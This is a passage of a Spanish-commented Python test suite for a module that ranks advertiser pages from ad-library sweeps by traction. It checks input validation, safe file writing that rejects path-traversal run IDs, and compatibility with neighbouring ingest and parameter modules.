        self.assertEqual(self.rank_fix(ahora=otro)["generado_en"], "2027-01-02T03:04:05Z")

    def test_ahora_sin_zona_es_error_de_uso(self):
        for malo in (datetime(2026, 11, 6, 7, 0, 0), "2026-11-06T07:00:00Z", None):
            with self.subTest(malo=malo), self.assertRaises(pm.ErrorUso):
                self.rank_fix(ahora=malo)

    def test_par_barrido_defectuoso(self):
        with self.assertRaises(pm.ErrorLimite):
            self.rank_fix(par_barrido={k: v for k, v in self.pb.items() if k != "barrido_paises_origen"})
        with self.assertRaises(pm.ErrorUso):
            self.rank_fix(par_barrido=None)
        for malo in ([], ["us"], "US", [5]):
            with self.subTest(malo=malo), self.assertRaises(pm.ErrorValidacion):
                self.rank_fix(par_barrido={**self.pb, "barrido_paises_origen": malo})
        for malo in ("es", {"us": "en"}, {"US": ""}, {"US": 5}):
            with self.subTest(idiomas=malo), self.assertRaises(pm.ErrorValidacion):
                self.rank_fix(par_barrido={**self.pb, "barrido_idioma_por_pais": malo})

    def test_el_documento_trae_los_campos_del_contrato(self):
        doc = self.rank_fix()
        for campo in ("schema_version", "corrida_id", "generado_en", "umbrales_traccion", "resumen", "memoria",
                      "idiomas_por_pais", "temas", "matriz_tema_pais", "exportadores", "descartadas",
                      "advertencias"):
            self.assertIn(campo, doc)
        self.assertEqual((doc["schema_version"], doc["corrida_id"]), ("1.0.0", "2026-11-06-a"))
        self.assertEqual(doc["umbrales_traccion"]["anuncios_activos"], 15)
        self.assertEqual(doc["umbrales_traccion"]["edad_oferta_dias"], "10")
        self.assertEqual(doc["advertencias_ingesta"], cargar("paginas.json")["advertencias"])


# ---------------------------------------------------------------------------
# Escritura
# ---------------------------------------------------------------------------

class PruebaEscritura(Base):
    def setUp(self):
        super().setUp()
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.raiz = Path(self.tmp.name)

    def test_escribir_candidatos_en_la_ruta_del_contrato(self):
        doc = self.rank_fix()
        ruta = ranking.escribir_candidatos(doc, self.raiz)
        self.assertEqual(ruta, self.raiz / "empresa" / "barrido" / "candidatos" / "2026-11-06-a.json")
        self.assertEqual(json.loads(ruta.read_text(encoding="utf-8")), doc)

    def test_no_sobrescribe_candidatos(self):
        doc = self.rank_fix()
        ranking.escribir_candidatos(doc, self.raiz)
        with self.assertRaises(pm.ErrorUso):
            ranking.escribir_candidatos(doc, self.raiz)

    def test_escribir_candidatos_rechaza_documentos_raros(self):
        doc = self.rank_fix()
        for malo in (None, {}, {**doc, "schema_version": "9.9.9"}, {**doc, "temas": None}):
            with self.subTest(malo=type(malo).__name__), self.assertRaises(pm.ErrorValidacion):
                ranking.escribir_candidatos(malo, self.raiz)
        with self.assertRaises(pm.ErrorUso):
            ranking.escribir_candidatos({**doc, "corrida_id": "../x"}, self.raiz)
        with self.assertRaises(pm.ErrorValidacion):
            ranking.escribir_candidatos({**doc, "extra": 1.5}, self.raiz)
        self.assertFalse((self.raiz / "empresa").exists())  # nada se creó

    def test_escribir_fichas_borrador_y_releerlas_con_el_validador(self):
        fichas = ranking.puente_a_fichas(self.rank_fix(), None, self.p)
        ruta = ranking.escribir_fichas_borrador(fichas, self.raiz)
        self.assertEqual(ruta, self.raiz / "empresa" / "barrido" / "candidatos" / "2026-11-06-a" / "fichas_borrador.json")
        leido = pm.leer_json(ruta)
        self.assertEqual(len(pm.validar_fichas(leido, self.p)), 7)
        self.assertEqual(leido, json.loads(json.dumps(fichas)))

    def test_el_borrador_en_disco_se_puede_puntuar_con_la_cli_de_puntaje(self):
        ruta = ranking.escribir_fichas_borrador(ranking.puente_a_fichas(self.rank_fix(), None, self.p), self.raiz)
        pares = pm.puntuar(pm.leer_json(ruta), self.p)
        self.assertEqual({x["estado"] for x in pares}, {"incompleta"})

    def test_no_sobrescribe_fichas(self):
        fichas = ranking.puente_a_fichas(self.rank_fix(), None, self.p)
        ranking.escribir_fichas_borrador(fichas, self.raiz)
        with self.assertRaises(pm.ErrorUso):
            ranking.escribir_fichas_borrador(fichas, self.raiz)

    def test_sin_fichas_no_se_escribe_nada_y_devuelve_none(self):
        fichas = ranking.puente_a_fichas(self.rank([pg(1, anuncios=2, edad="1", conceptos=1)], [et(1)]), None, self.p)
        self.assertEqual(fichas["ofertas"], [])
        self.assertIsNone(ranking.escribir_fichas_borrador(fichas, self.raiz))
        self.assertFalse((self.raiz / "empresa").exists())

    def test_corrida_id_explicito_o_desde_la_nota(self):
        fichas = ranking.puente_a_fichas(self.rank_fix(), None, self.p)
        ruta = ranking.escribir_fichas_borrador(fichas, self.raiz, corrida_id="2026-11-07-b")
        self.assertIn("2026-11-07-b", str(ruta))
        sin_nota = {k: v for k, v in fichas.items() if k != "_nota"}
        with self.assertRaises(pm.ErrorUso):
            ranking.escribir_fichas_borrador(sin_nota, self.raiz)
        with self.assertRaises(pm.ErrorUso):
            ranking.escribir_fichas_borrador(fichas, self.raiz, corrida_id="../mala")

    def test_escribir_fichas_rechaza_documentos_que_no_son_fichas_2_0_0(self):
        for malo in (None, {}, {"schema_version": "1.0.0", "ofertas": []}, {"schema_version": "2.0.0", "ofertas": None}):
            with self.subTest(malo=malo), self.assertRaises(pm.ErrorValidacion):
                ranking.escribir_fichas_borrador(malo, self.raiz, corrida_id="2026-11-06-a")

    def test_las_rutas_nunca_apuntan_al_empresa_real(self):
        self.assertTrue(str(ranking.ruta_candidatos("2026-11-06-a", self.raiz)).startswith(str(self.raiz)))
        self.assertTrue(str(ranking.ruta_fichas_borrador("2026-11-06-a", self.raiz)).startswith(str(self.raiz)))
        with self.assertRaises(pm.ErrorUso):
            ranking.ruta_candidatos("../../x", self.raiz)


# ---------------------------------------------------------------------------
# Compatibilidad con los módulos vecinos (B2 ingesta, B1 parámetros)
# ---------------------------------------------------------------------------

class PruebaCompatibilidad(Base):
    def ingestar(self, con_consultas_por_pagina):
        from scripts.modelado.barrido import ingesta
        inicio = int(AHORA.timestamp())

        def anuncio(i, page_id, nombre, titulo, dias, moneda="USD"):
            ad_id = str(2000000000000000 + i)
            return {"id": ad_id, "page_id": int(page_id), "page_name": nombre, "ad_creative_link_title": titulo,
                    "ad_delivery_start_time": inicio - int(dias * 86400) - i,
                    "currency": moneda, "ad_snapshot_url": f"https://www.facebook.com/ads/library/?id={ad_id}"}

        def crudo(qid, ads, limit, total, page_ids=None):
            return {"schema_version": "1.0.0", "corrida_id": "2026-11-06-a", "qid": qid,
                    "consulta": {"search_terms": "x", "countries": ["ES"], "ad_active_status": "ACTIVE",
                                 "limit": limit, "page_ids": page_ids},
                    "capturado_en": "2026-11-06T06:00:00Z", "ruta": "A", "estimated_total_count": total, "ads": ads}

        a = [anuncio(i, pid(1), "Pagina Larga", f"Título {i % 3}", 12) for i in range(16)]          # 16 anuncios, 12 días
        b = [anuncio(100 + i, pid(2), "Pagina Corta", "Solo uno", 1) for i in range(3)]
        c = [anuncio(200 + i, pid(3), "Pagina Truncada", f"Gancho {i}", 2, "BRL") for i in range(5)]
        crudos = {"es-uno": crudo("es-uno", a + b, 50, 19), "es-dos": crudo("es-dos", c, 5, 100)}
        if con_consultas_por_pagina:  # pasada 3: una consulta por page_id y país
            crudos["pag-uno"] = crudo("pag-uno", a, 50, 16, [pid(1)])
            crudos["pag-dos"] = crudo("pag-dos", b, 50, 3, [pid(2)])
            crudos["pag-tres"] = crudo("pag-tres", c, 5, 100, [pid(3)])
        with tempfile.TemporaryDirectory() as tmp:
            raiz = Path(tmp)
            carpeta = raiz / "empresa" / "barrido" / "crudo" / "2026-11-06-a"
            carpeta.mkdir(parents=True)
            for qid, doc in crudos.items():
                (carpeta / f"{qid}.json").write_text(json.dumps(doc), encoding="utf-8")
            return ingesta.ingestar_corrida("2026-11-06-a", raiz=raiz, ahora=AHORA, par_barrido=self.pb,
                                            par_modelado=self.p)

    def rankear_ingesta(self, paginas):
        etiquetas = {"corrida_id": "2026-11-06-a", "paginas": [et(1, "tema-a"), et(2, "tema-a"), et(3, "tema-b")]}
        # el plan también barrió US (sin resultados): sin esa columna no habría ningún país donde falte el tema
        return ranking.rankear(paginas, etiquetas, par_modelado=self.p, par_barrido=self.pb, ahora=AHORA,
                               paises_barridos=["US"])

    def test_lee_la_salida_real_de_ingesta_solo_con_muestra(self):
        try:
            paginas = self.ingestar(False)
        except ImportError:  # pragma: no cover
            self.skipTest("ingesta.py no disponible")
        if "medicion" not in paginas["paginas"][0]:  # pragma: no cover
            self.skipTest("ingesta.py aún no trae la medición de la pasada 3")
        doc = self.rankear_ingesta(paginas)
        self.assertEqual({p["medicion"]["estado"] for p in paginas["paginas"]}, {"muestra"})
        self.assertEqual(self.pagina(doc, 1)["estado_traccion"], "pasa")  # 16 anuncios y 12 días ya superan: definitivo
        # sin consulta por page_id un conteo de muestra no prueba nada: 3 anuncios NO descartan a la página
        self.assertEqual(self.pagina(doc, 2)["estado_traccion"], "indeterminada_por_muestra")
        self.assertEqual(self.pagina(doc, 3)["estado_traccion"], "indeterminada_por_muestra")
        self.assertTrue(self.pagina(doc, 3)["muestra_truncada"])
        self.assertIs(self.pagina(doc, 3)["exportador"]["senal"], True)  # cuenta en BRL anunciando en ES (B2)
        self.assertIs(self.pagina(doc, 1)["exportador"]["senal"], False)
        self.assertTrue(self.pagina(doc, 1)["edad_es_piso"])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        pm.validar_fichas(fichas, self.p)
        self.assertEqual(fichas["ofertas"][0]["traccion"]["anuncios_activos"], 16)

    def test_lee_la_salida_real_de_ingesta_con_consultas_por_pagina(self):
        try:
            paginas = self.ingestar(True)
        except ImportError:  # pragma: no cover
            self.skipTest("ingesta.py no disponible")
        if "medicion" not in paginas["paginas"][0]:  # pragma: no cover
            self.skipTest("ingesta.py aún no trae la medición de la pasada 3")
        doc = self.rankear_ingesta(paginas)
        estados = {p["page_id"]: p["medicion"]["estado"] for p in paginas["paginas"]}
        self.assertEqual(estados, {pid(1): "completa", pid(2): "completa", pid(3): "parcial"})
        self.assertEqual(self.pagina(doc, 1)["estado_traccion"], "pasa")
        self.assertFalse(self.pagina(doc, 1)["edad_es_piso"])
        self.assertEqual(self.pagina(doc, 2)["estado_traccion"], "no_pasa")  # medición completa con 3 anuncios: definitivo
        self.assertEqual(self.pagina(doc, 3)["estado_traccion"], "indeterminada_por_muestra")  # 100 anuncios, 2 días y piso
        self.assertEqual(self.pagina(doc, 3)["anuncios_activos_medidos"], 100)
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(len(pm.validar_fichas(fichas, self.p)), 1)

    @unittest.skipUnless(PROPUESTA_BARRIDO.exists(), "parametros_barrido.propuesta.yaml (B1) aún no existe")
    def test_funciona_con_los_parametros_reales_de_barrido(self):
        from scripts.modelado.barrido import plan
        pb = dict(comun.cargar_parametros_barrido(PROPUESTA_BARRIDO))
        with self.assertRaises(pm.ErrorLimite):  # el YAML no trae idiomas: el CLI los pone desde el banco de frases
            self.rank_fix(par_barrido=pb)
        pb["barrido_idioma_por_pais"] = plan.cargar_banco()["pais_idioma"]
        doc = self.rank_fix(par_barrido=pb)
        self.assertEqual(len(doc["temas"]), 7)
        pm.validar_fichas(ranking.puente_a_fichas(doc, None, self.p), self.p)

    def test_el_idioma_por_pais_puede_venir_del_banco_de_frases_de_plan(self):  # el CLI lo pasa así
        try:
            from scripts.modelado.barrido import plan
            banco = plan.cargar_banco()
        except (ImportError, AttributeError):  # pragma: no cover
            self.skipTest("plan.cargar_banco no disponible")
        pb = {**self.pb, "barrido_idioma_por_pais": banco["pais_idioma"]}
        doc = self.rank_fix(par_barrido=pb)
        self.assertEqual(doc["idiomas_por_pais"], {p: banco["pais_idioma"][p] for p in doc["idiomas_por_pais"]})
        pm.validar_fichas(ranking.puente_a_fichas(doc, None, self.p), self.p)

    def test_funciona_con_el_par_modelado_normalizado_de_puntaje_modelar(self):
        par = pm.cargar_parametros(PROPUESTA)
        doc = self.rank_fix(par_modelado=par)
        self.assertEqual(doc["resumen"]["temas_pasan_traccion"], 5)


if __name__ == "__main__":
    unittest.main()
